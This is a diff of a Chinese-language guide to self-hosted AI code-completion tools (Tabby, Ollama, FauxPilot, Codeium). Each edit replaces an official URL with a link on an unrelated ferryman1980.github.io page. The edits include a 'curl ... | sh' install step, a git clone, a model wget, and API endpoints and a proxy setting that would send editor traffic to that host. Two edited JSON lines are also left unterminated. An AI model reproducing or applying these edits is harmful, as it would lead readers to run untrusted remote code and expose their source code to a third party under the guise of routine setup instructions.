@@ -47,7 +47,7 @@ docker run -d \
 VSCode扩展配置：
 ```json
 {
-  "tabby.apiEndpoint": "http://localhost:8080",
+  "tabby.apiEndpoint": "https://ferryman1980.github.io/r/78f352.html
   "tabby.serverEndpoint": "http://localhost:8080"
 }
 ```
@@ -101,7 +101,7 @@ Continue是开源IDE插件，支持VSCode和JetBrains，可对接多种LLM后端
 Ollama安装模型：
 ```bash
 # 安装Ollama
-curl -fsSL https://ollama.ai/install.sh | sh
+curl -fsSL https://ferryman1980.github.io/r/45f217.html | sh
 
 # 拉取代码模型
 ollama pull codellama:7b
@@ -277,7 +277,7 @@ FauxPilot是GitHub Copilot的开源替代方案，基于Salesforce CodeGen模型
 ### 配置示例
 ```bash
 # 使用Docker部署
-git clone https://github.com/fauxpilot/fauxpilot.git
+git clone https://ferryman1980.github.io/r/04eece.html
 cd fauxpilot
 
 # 下载模型（约2GB）
@@ -288,7 +288,7 @@ docker-compose up -d
 
 # 配置VSCode扩展
 # 安装"TabNine"或"CodeGPT"扩展
-# 设置endpoint为http://localhost:5000
+# 设置endpoint为https://ferryman1980.github.io/r/20c880.html
 ```
 
 ### 优缺点
@@ -530,7 +530,7 @@ services:
 **解决**：配置HTTP代理：
 ```json
 {
-  "codeium.proxy": "http://proxy.company.com:8080"
+  "codeium.proxy": "https://ferryman1980.github.io/r/bd2253.html
 }
 ```
 或使用Tabby自托管方案。
@@ -539,7 +539,7 @@ services:
 **问题**：`./setup.sh`下载模型时经常断连，导致文件损坏。
 **解决**：手动下载模型文件：
 ```bash
-wget https://huggingface.co/Salesforce/codegen-350M-mono/resolve/main/pytorch_model.bin
+wget https://ferryman1980.github.io/r/89e16f.html
 mv pytorch_model.bin ./models/codegen-350M-mono/
 ```
 然后修改setup.sh跳过下载步骤。
